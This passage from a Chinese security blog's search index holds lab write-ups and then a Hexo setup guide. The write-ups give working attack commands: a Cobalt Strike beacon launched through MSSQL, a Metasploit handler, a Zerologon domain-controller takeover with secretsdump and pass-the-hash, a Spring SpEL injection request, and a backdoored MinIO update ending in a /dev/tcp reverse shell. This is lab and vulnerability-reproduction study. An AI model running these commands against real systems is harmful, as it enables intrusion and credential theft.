alt=\"image\"></p>\n<p>使用xpcmdshell执行以下命令，可以创建文件夹了</p>\n<p><img src=\"UjfVfqimOexOWlSs-WgDwpre8CvnXStf0vcfbt4iWFc.png\" alt=\"image\"></p>\n<p>尝试下载生成的木马，发现没用权限，拒绝访问</p>\n<p><img src=\"nfI_4BLL_UeR0WLSMxO2ZS68zoEsUqPHq02HakyaonU.png\" alt=\"image\"></p>\n<p>尝试powershell上线CS，成功上线</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> @shell <span class=\"keyword\">int</span> exec sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>,@shell output exec sp_oamethod @shell,<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"literal\">null</span>,<span class=\"string\">&#x27;powershell上线内容&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Y16Fr2UfEVNPHEDfaIm7wUs1WDHAifxi_17-UgZTuEI.png\" alt=\"image\"></p>\n<p><img src=\"aquBLN7lk1bUHUfvD0VzlDEjQrbtBAUl3bVV2wRFmrg.png\" alt=\"image\"></p>\n<p>派生一个给msf</p>\n<p>use exploit&#x2F;multi&#x2F;handler</p>\n<p>set payload windows&#x2F;meterpreter&#x2F;reverse_http</p>\n<p>set lhost 192.168.8.133</p>\n<p> set lport 13782</p>\n<p><img src=\"aGD3koKShSC4eO9FIGA5eGH7RhaBH1ucK_oBiq4JbbQ.png\" alt=\"image\"></p>\n<p>提权</p>\n<p>当前权限只是数据库权限，需要提权为system，这里使用PrintSpoofer</p>\n<p><img src=\"x0RLhe8FKCkAuqXUHEPkLmZtBIYcxQKSW6QaFQ8M9d4.png\" alt=\"image\"></p>\n<p>然后再上线一个system权限的session</p>\n<p><img src=\"e8VGwT0kwymRqvplCrxidSuN38xz-ftlBGj-uJkxkT8.png\" alt=\"image\"></p>\n<p>导出hash</p>\n<p><img src=\"WrB273TRZOFdjOsTfRZ0llY74lgqf8f3iWCHCRD-W9k.png\" alt=\"image\"></p>\n<p>破解到密码</p>\n<p><img src=\"kEPafJaATAswZpZgVncpDOXKjtqRWGbcfieBHfIxoBQ.png\" alt=\"image\"></p>\n<p>查看flag</p>\n<p>type root.txt</p>\n<p>moonsec_flag{moonsec-557be9af7d66991560155201dc521627}</p>\n<p><img src=\"Q1UlhkwoygUgscOObw4lAlUoo5U2SL1RPTZInYzO6uU.png\" alt=\"image\"></p>\n<h3 id=\"信息收集-2\"><a href=\"#信息收集-2\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><p><img src=\"0pCg677i6cLEu3f22OL_SfY_Ee0RjPH1yxblWo-NaF0.png\" alt=\"image\"></p>\n<p><img src=\"XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png\" alt=\"image\"></p>\n<p><img src=\"DxJumeqo0NIv_I76J-YPhrb5WUsJd37TFZjPKsK2Uy8.png\" alt=\"image\"></p>\n<p>判断出是有域的，且为scaner.sec，域控名称为ad.scaner.sec</p>\n<p>查看系统信息</p>\n<p><img src=\"XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png\" alt=\"image\"></p>\n<p>arp -a</p>\n<p><img src=\"o1r7TvvmDGhrfiu3GgCIL9hwAHzpKaKs0yO6ITa36OA.png\" alt=\"image\"></p>\n<p>查看用户信息，没发现域用户</p>\n<p><img src=\"vvjP-3rte4i5egKEKwDpGFMogGF-ohOYSL2uiamslcQ.png\" alt=\"image\"></p>\n<p>也没有域用户的进程</p>\n<p><img src=\"hf4SHpxlcyxWg6QKBa6JuIv6jY1mC0_-ts2elqVy5W0.png\" alt=\"image\"></p>\n<h2 id=\"cve-2020-1472拿下域控\"><a href=\"#cve-2020-1472拿下域控\" class=\"headerlink\" title=\"cve-2020-1472拿下域控\"></a>cve-2020-1472拿下域控</h2><p>分析了以下前面的信息，目前能到权限，知道域控名称和域的一些信息，但是没有拿到一个域的普通用户，这时候想起了置空漏洞，这个漏洞不需要普通的域用户就可以打。</p>\n<p>走代理打域控</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 ./cve-<span class=\"number\">2020</span>-<span class=\"number\">1472</span>-exploit.py ad <span class=\"number\">10.10</span>.<span class=\"number\">10.135</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"vlZhm2FLGS_qLHLXwAuGSuxdY--o4jIVD_nxXxi3od4.png\" alt=\"image\"></p>\n<p>发现成功了，有些惊喜，在预料之后也在预料之外</p>\n<p><img src=\"vUUw8TyUOu189TGuc8YWqP2wbVyufByk38dZZnJWP38.png\" alt=\"image\"></p>\n<h3 id=\"Impacket-secretsdump-获取域控哈希\"><a href=\"#Impacket-secretsdump-获取域控哈希\" class=\"headerlink\" title=\"Impacket secretsdump 获取域控哈希\"></a>Impacket secretsdump 获取域控哈希</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 python3 secretsdump.py scaner.sec/ad\\$@<span class=\"number\">10.10</span>.<span class=\"number\">10.135</span> -just-dc -hashes :</span><br></pre></td></tr></table></figure>\n<p><img src=\"CvxJcyJU5HIFSCEbT2kSqLmUZ5A2i_7jjWIQGsXpF-k.png\" alt=\"image\"></p>\n<h3 id=\"通过-smbexec-登录域控制器\"><a href=\"#通过-smbexec-登录域控制器\" class=\"headerlink\" title=\"通过 smbexec 登录域控制器\"></a>通过 smbexec 登录域控制器</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class=\"number\">35</span>dc382e7d31f6823c2e34216d4c15cb administrator@<span class=\"number\">10.10</span>.<span class=\"number\">10.135</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"47drsqGtQDe_awys4QZYi7lg_C9dMxziC6HU56xBJwo.png\" alt=\"image\"></p>\n<p><img src=\"kJeZm6w7d-oxvFuOtMqCmyGSrX3IAR5AGXBQEzUm6pU.png\" alt=\"image\"></p>\n<p>拿到flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">type C:\\Users\\Administrator\\root.txt</span><br><span class=\"line\">C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\root.txt</span><br><span class=\"line\">moonsec_flag&#123;moonsec-<span class=\"number\">8</span>aff4877eb76417460c0fc7f84b32566&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"UdDZbU-TmNDduh7SdqVM6tX9M8nmHhF0JkHVgAfc0fM.png\" alt=\"image\"></p>\n","categories":["实战记录"],"tags":["域控","红蓝对抗","红队打点"]},{"title":"spring-spel复现（CVE-2022-22963）","url":"/2022/05/06/spring-spel%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-22963%EF%BC%89/","content":"<h1 id=\"spring-spel复现（CVE-2022-22963）\"><a href=\"#spring-spel复现（CVE-2022-22963）\" class=\"headerlink\" title=\"spring-spel复现（CVE-2022-22963）\"></a>spring-spel复现（CVE-2022-22963）</h1><h2 id=\"CVE-2022-22963\"><a href=\"#CVE-2022-22963\" class=\"headerlink\" title=\"CVE-2022-22963\"></a>CVE-2022-22963</h2><p>Spring Cloud Function 是基于 Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。<br>由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>\n<h2 id=\"环境搭建：\"><a href=\"#环境搭建：\" class=\"headerlink\" title=\"环境搭建：\"></a>环境搭建：</h2><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip</span><br><span class=\"line\">unzip v3.1.6.zip</span><br><span class=\"line\">cd spring-cloud-function-3.1.6</span><br><span class=\"line\">cd spring-cloud-function-samples/function-sample-pojo</span><br><span class=\"line\">mvn package</span><br><span class=\"line\">java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar</span><br></pre></td></tr></table></figure>\n<p><img src=\"40-iNlD6QLMzbytc1n1BECzBAJfn0p9cg-aiS66ltyE.png\" alt=\"image\"></p>\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">find . -name &quot;*.java&quot;|xargs -I % cat %|grep -Eo &#x27;&quot;([^&quot; \\.\\/=&gt;\\|,:\\&#125;\\+\\)&#x27;&quot;&#x27;&quot;&#x27;]&#123;8,&#125;)&quot;&#x27;|sort -u|sed &#x27;s/&quot;//g&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">functionRouter</span><br><span class=\"line\">uppercase</span><br><span class=\"line\">lowercase</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p><img src=\"o_aHMocsoKZrpFQ9yw_ZXQ1QnNMEWHIdEdniRN-Lbic.png\" alt=\"image\"></p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /functionRouter HTTP/1.1</span><br><span class=\"line\">Host: 172.16.16.127:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 3</span><br><span class=\"line\">spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">sec</span><br></pre></td></tr></table></figure>\n<p><img src=\"SOTqhFjVV3MdophtDQZCOQVkrmAEgyesmRTN0cJ3B-o.png\" alt=\"image\"></p>\n<p><img src=\"EKtM0GAkORFMLK_YrVtp7NrJ4QVVerxooP6Fk3l0IbY.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","spel"]},{"title":"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）","url":"/2023/04/11/%E4%B8%AD%E9%97%B4%E4%BB%B6MinIO%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E7%9A%84RCE%EF%BC%88CVE-2023-28432%EF%BC%89/","content":"<h1 id=\"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\"><a href=\"#中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\" class=\"headerlink\" title=\"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\"></a>中间件MinIO信息泄露导致的RCE（CVE-2023-28432）</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>Minio 是一个基于Go语言的对象存储服务。它实现了大部分亚马逊S3云存储服务接口，可以看做是是S3的开源版本，非常适合于存储大容量非结构化的数据，例如图片、视频、日志文件、备份数据和容器&#x2F;虚拟机镜像等。MinIO verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>\n<p>默认账号密码是：minioadmin&#x2F;minioadmin</p>\n<h2 id=\"漏洞利用方式\"><a href=\"#漏洞利用方式\" class=\"headerlink\" title=\"漏洞利用方式\"></a>漏洞利用方式</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">版本号检测：</span><br><span class=\"line\"><span class=\"number\">1.</span>http请求：GET /api/v1/check-version</span><br><span class=\"line\"><span class=\"number\">2.</span>HTTP响应版本小于RELEASE<span class=\"number\">.2023</span>-<span class=\"number\">03</span>-20T20-<span class=\"number\">16</span>-18Z则存在漏洞。</span><br><span class=\"line\">信息泄漏：</span><br><span class=\"line\">POST /minio/bootstrap/v1/verify HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">RCE思路：</span><br><span class=\"line\">利用泄露的账号密码和MinIO客户端登录并设置MinIO的升级访问URL，因为MinIO对于升级包的sha256sum校验失效，所以能够有损的RCE。</span><br><span class=\"line\"><span class=\"number\">1.</span>设置升级url：mc alias set myminio http:<span class=\"comment\">//ip:9000  user_R3s3arcm pwd_R3s3arcm</span></span><br><span class=\"line\"><span class=\"number\">2.</span>触发更新：mc admin update myminio -y</span><br></pre></td></tr></table></figure>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>使用vulhub的docker搭建服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://hub.nuaa.cf/vulhub/vulhub/tree/master/minio/CVE-2023-28432</span><br><span class=\"line\">下载docker-compose.yml之后进行启动</span><br><span class=\"line\">docker-compose up -d</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"q2eW7vxAoq_cQOdUJICMTGS1ORd-tY_QrBjnRAv5BaU.png\" alt=\"image\"></p>\n<p>10.211.55.9:9001</p>\n<p><img src=\"5pGs45rYXfI4IIX_yrg8j6UNU3WuSTHSxti-qfHS0BA.png\" alt=\"image\"></p>\n<p>非官方的镜像，没有公钥，不用绕过。</p>\n<p><img src=\"Wf6XMp8cRyDvRBpncc5dq1Q5eO2yvCdGIrlt9DxeFQ8.png\" alt=\"image\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>POC</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /minio/bootstrap/v1/verify HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">10.211</span><span class=\"number\">.55</span><span class=\"number\">.9</span>:<span class=\"number\">9000</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Macintosh; Intel Mac OS X <span class=\"number\">10_15_7</span>) AppleWebKit/<span class=\"number\">537.36</span> (KHTML, like Gecko) wwlocal/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> Chrome/<span class=\"number\">96.0</span><span class=\"number\">.4664</span><span class=\"number\">.174</span> Electron/<span class=\"number\">16.2</span><span class=\"number\">.2</span> Safari/<span class=\"number\">537.36</span> wxwork/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> wwlocal/<span class=\"number\">1.0</span> wxworklocal/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> WXDrive/<span class=\"number\">2.0</span> MicroMessenger/<span class=\"number\">6.3</span><span class=\"number\">.22</span></span><br><span class=\"line\">Accept: *<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Referer: http://10.211.55.9:9001/login</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 0</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">//注意需要请求访问的是9000端口</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"e-2dWrOorzFeE48zhbEp2YA5xvBZm7Un53JSQPkZAfM.png\" alt=\"image\"></p>\n<p>得到了账号密码 minioadmin&#x2F;minioadmin-vulhub</p>\n<p><img src=\"LbUTfRDHNx9wGc1cy0rETLHUY4hOKeR_nafy8m1cv7w.png\" alt=\"image\"></p>\n<h2 id=\"安装mc客户端\"><a href=\"#安装mc客户端\" class=\"headerlink\" title=\"安装mc客户端\"></a>安装mc客户端</h2><p>折腾了一下mac端的mac客户端，没成功之后，就改使用docker版本的mc客户端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 容器安装</span></span><br><span class=\"line\">$ docker pull minio/mc</span><br><span class=\"line\"><span class=\"comment\">#直接执行命令</span></span><br><span class=\"line\">$ docker run minio/mc <span class=\"built_in\">ls</span> play</span><br><span class=\"line\"><span class=\"comment\">#进入容器执行命令</span></span><br><span class=\"line\">docker run -it --entrypoint=/bin/sh minio/mc</span><br></pre></td></tr></table></figure>\n<p>连接尝试，添加实例，添加成功。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mc config host add miniode1 http://10.211.55.9:9000 minioadmin minioadmin-vulhub</span><br></pre></td></tr></table></figure>\n<p><img src=\"SKuMBd-r3II1gPEl0Y5NGOB7kVMZdhQwHlboVBA7Zo8.png\" alt=\"image\"></p>\n<h2 id=\"RCE复现\"><a href=\"#RCE复现\" class=\"headerlink\" title=\"RCE复现\"></a>RCE复现</h2><p>大佬修改好的后门版本下载地址：<a href=\"https://github.com/AbelChe/evil_minio\">https://github.com/AbelChe/evil_minio</a></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//编译</span></span><br><span class=\"line\">CGO_ENABLED=<span class=\"number\">0</span> GOOS=linux GOARCH=amd64 <span class=\"keyword\">go</span> build -ldflags=<span class=\"string\">&quot;-s -w&quot;</span> -trimpath</span><br><span class=\"line\"><span class=\"comment\">//重命名</span></span><br><span class=\"line\">mv minio minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z</span><br><span class=\"line\"><span class=\"comment\">//shasum校验</span></span><br><span class=\"line\">shasum -a <span class=\"number\">256</span> minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z &gt; minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z.sha256sum</span><br><span class=\"line\">启动http服务</span><br><span class=\"line\">python3 -m http.server <span class=\"number\">18090</span></span><br></pre></td></tr></table></figure>\n<p>编译报错了</p>\n<p><img src=\"GVYHArrAGvKaZ0a7KbpLPzhyMmPfnPQZw40GGa96_9g.png\" alt=\"image\"></p>\n<p>解决：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">go</span> env -w GOPROXY=https:<span class=\"comment\">//goproxy.cn,direct​</span></span><br><span class=\"line\"><span class=\"keyword\">go</span> clean -modcache</span><br><span class=\"line\"><span class=\"keyword\">go</span> mod tidy</span><br></pre></td></tr></table></figure>\n<p>执行完成之后，再继续执行最上面的命令进行编译。再次遇到问题，golang版本太低，本机的版本是1.7.5；提示需要1.8版本和1.19.1；查了一下官方信息，需要1.19以上版本的go环境运行。</p>\n<p><img src=\"-_tQ0X7YlAQJFTENqAd5L9IMVkTrkhtmnvjXJrq2AGI.png\" alt=\"image\"></p>\n<p><img src=\"UpHVOBVem_Un5dTrwt7kKm0ANLzAz6HCy1DzlYvlw5o.png\" alt=\"image\"></p>\n<p>升级golang的版本；下载 golang 版本升级工具</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/udhos/update-golang</span></span><br></pre></td></tr></table></figure>\n<p>执行升级命令</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd update-golang</span><br><span class=\"line\">sudo RELEASE=<span class=\"number\">1.19</span><span class=\"number\">.1</span> ./update-golang.sh</span><br><span class=\"line\">说明： RELEASE=<span class=\"number\">1.19</span><span class=\"number\">.1</span> 指定 golang 需要升级的版本</span><br><span class=\"line\"><span class=\"keyword\">go</span> version</span><br></pre></td></tr></table></figure>\n<p><img src=\"DoYjRem3iwT7z6d5waP-vRX_qRP36cqxUWMG0j7oeNo.png\" alt=\"image\"></p>\n<p>继续编译，编译成功。并且重命名一下</p>\n<p><img src=\"8auTGLP7uGQT2TE1nfImmBEsAqfL3G7vLl-mWF7y6xk.png\" alt=\"image\"></p>\n<p>校验一下sha256</p>\n<p><img src=\"t8kBmm5v5PopSPahxZpjQWtHYkWqpjbGZDNnQC0xgig.png\" alt=\"image\"></p>\n<p>RCE</p>\n<p>为了直观点，我们可以创建一个桶（此操作非必须）</p>\n<p><img src=\"eJfffU4hVF-Fx63iFlbuOJUNWhRLvXx-FH6LC7lCanQ.png\" alt=\"image\"></p>\n<p>使用mc客户端进行操作</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#添加 MinIO服务案例</span></span><br><span class=\"line\">mc config host add docker_minio1 http://ip:9000 用户名 密码</span><br><span class=\"line\"><span class=\"comment\">#添加 MinIO服务</span></span><br><span class=\"line\">mc config host add miniode1 http://10.211.55.9:9000 minioadmin minioadmin-vulhub</span><br><span class=\"line\"><span class=\"comment\">#ls命令 - 列出对象(可以不执行这一步)</span></span><br><span class=\"line\">mc <span class=\"built_in\">ls</span> miniode1</span><br><span class=\"line\"><span class=\"comment\">#下载更新包更新</span></span><br><span class=\"line\">mc admin update miniode1 http://10.211.55.2:18090/minio.RELEASE.2023-03-22T06-36-24Z.<span class=\"built_in\">sha256sum</span> -y</span><br></pre></td></tr></table></figure>\n<p>成功升级</p>\n<p><img src=\"2hR9Gze1yooxkC5Ls11wGKbHEpTJjSlchAkozHRHJmI.png\" alt=\"image\"></p>\n<p>尝试执行命令</p>\n<p>踩坑：（这里一开始一直使用9001端口访问，一直都没成功，以为自己的升级包有问题）</p>\n<p>最后使用9000端口进行请求，成功执行了命令</p>\n<p><img src=\"hsqPypsa1S9iwGdVMarn-5inxAjps0n1o691yaGfSvg.png\" alt=\"image\"></p>\n<p>反弹shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/sh -i &gt;&amp; /dev/tcp/10.211.55.2/4567 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">curl <span class=\"string\">&#x27;http://10.211.55.9:9000/?alive=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.211.55.2%2F4567%200%3E%261&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"co4RpHjVQfJE12ctkaE-0qL71WZg5tVJwylcO4kQLlo.png\" alt=\"image\"></p>\n<p>功能依然正常，未受到影响</p>\n<p><img src=\"Q4ZS-PAwMS_7jhB22lxQFDKrxREsrt-kcllgjvSmz3o.png\" alt=\"image\"></p>\n<p>总结：</p>\n<ul>\n<li>环境搭建过程遇到了较多的问题：主要是当时没有科学上网，拉取国外资源的时候太慢了，会有一些莫名其妙的报错。</li>\n<li>golang的版本：其次是golang环境的版本，太久没更新本地golang环境，导致无法正常编译。</li>\n<li>验证是否成功</li>\n</ul>\n","categories":["漏洞复现"],"tags":["漏洞复现","MinIO","未授权访问"]},{"title":"搭建Hexo博客","url":"/2020/02/28/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/","content":"<h1 id=\"搭建Hexo博客\"><a href=\"#搭建Hexo博客\" class=\"headerlink\" title=\"搭建Hexo博客\"></a>搭建Hexo博客</h1><h2 id=\"Hexo简介\"><a href=\"#Hexo简介\" class=\"headerlink\" title=\"Hexo简介\"></a>Hexo简介</h2><p>Hexo是一个基于 node.js的快速生成静态博客的开源框架，支持 Markdown和大多数 Octopress插件，一个命令即可部署到 Github页面、 Giteee、 Heroku等，强大的APl，可无限扩，拥有数百个主题和插件。</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><h3 id=\"安装Node-js\"><a href=\"#安装Node-js\" class=\"headerlink\" title=\"安装Node.js\"></a>安装Node.js</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Node.js的版本需要不低于<span class=\"number\">10.13</span>，建议使用Node.js <span class=\"number\">12.0</span>及以上版本。</span><br></pre></td></tr></table></figure>\n<h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">从Git的官网选择相应的系统下载安装Git</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h2><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 在cmd中输入如下命令</span><br><span class=\"line\">npm install -g hexo-cli</span><br><span class=\"line\">#mac</span><br><span class=\"line\">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>\n<p>安装好后，可以输入<code>hexo -v</code>查看版本</p>\n<p><img src=\"97EVbDOVkyTC0he6iCBF8JU5xg5-16f3su45CJgDLDA.png\" alt=\"image\"></p>\n<h3 id=\"初始化Hexo\"><a href=\"#初始化Hexo\" class=\"headerlink\" title=\"初始化Hexo\"></a>初始化Hexo</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 按个人习惯，在某个盘符建立存储博客的文件夹。</span><br><span class=\"line\"># 首先需要在cmd中切换到相应的文件夹中，然后再输入如下命令。（其中hexoblog为存储博客的文件夹名）；会在当前目录下创建一个hexoblog文件夹</span><br><span class=\"line\">hexo init hexoblog</span><br></pre></td></tr></table></figure>\n<p><img src=\"T97hTLA9FRaqFeRUcaQbtr1V2RvzgtfauZyNwdzlAbI.png\" alt=\"image\"></p>\n<h3 id=\"npm的安装\"><a href=\"#npm的安装\" class=\"headerlink\" title=\"npm的安装\"></a>npm的安装</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 首先进入到存储博客的文件夹中。</span><br><span class=\"line\">cd hexoblog</span><br><span class=\"line\"># 然后安装npm</span><br><span class=\"line\">sudo npm install</span><br></pre></td></tr></table></figure>\n<p><img src=\"zygyREOvvqKBvEJ3BoVZUoUyEoJNi_jb3Jrp9QKljAA.png\" alt=\"image\"></p>\n<p>至此，Hexo本地站点就已安装好了，接下来就可以让它在本地跑起来。</p>\n<h3 id=\"启动项目\"><a href=\"#启动项目\" class=\"headerlink\" title=\"启动项目\"></a>启动项目</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 在cmd中依次输入以下命令</span><br><span class=\"line\"># 生成静态文件</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"># 启动服务</span><br><span class=\"line\">hexo server</span><br></pre></td></tr></table></figure>\n<p>访问网址：<a href=\"http://localhost:4000/%EF%BC%8C%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E7%9A%84Hexo%E4%BA%86\">http://localhost:4000/，就能看到本地搭建的Hexo了</a></p>\n<h2 id=\"更换主题\"><a href=\"#更换主题\" class=\"headerlink\" title=\"更换主题\"></a>更换主题</h2><h3 id=\"git下载主题\"><a href=\"#git下载主题\" class=\"headerlink\" title=\"git下载主题\"></a>git下载主题</h3><p>在hexo目录下的themes文件夹下打开git bash，输入以下命令，下载主题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/probberechts/hexo-theme-cactus.git</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"52mRukbLvXFYULRC4L1eQq07YOky_q3bG8bepR2kKsQ.png\" alt=\"image\"></p>\n<h3 id=\"配置-config-yml文件\"><a href=\"#配置-config-yml文件\" class=\"headerlink\" title=\"配置_config.yml文件\"></a>配置_config.yml文件</h3><p>打开hexo目录下的_config.yml文件，修改theme，注意冒号之后的空格。</p>\n<p>因为刚刚已经下载过主题，打开hexo目录下的themes文件夹会看到新生成的主题文件夹，将他的名字复制到_config.yml里并保存。</p>\n<p>（ps：注意hexo和themes的主题文件夹里各有一个_config.yml文件，不要搞混了，后续增加各种效果还需要用到的）</p>\n<p><img src=\"ifBnRSYs__7QeZYyKL0I0FSRwVYYLpWBnS-Q7umI2i8.png\" alt=\"image\"></p>\n<p><img src=\"imeJgzdY9zScz98N0PiBDxRsB05qu1ysdq-89-TZrNU.png\" alt=\"image\"></p>\n<h3 id=\"更新主题\"><a href=\"#更新主题\" class=\"headerlink\" title=\"更新主题\"></a>更新主题</h3><p>在hexo目录下，打开git bash，输入以下命令，清除缓存，生成静态文件，查看效果</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo 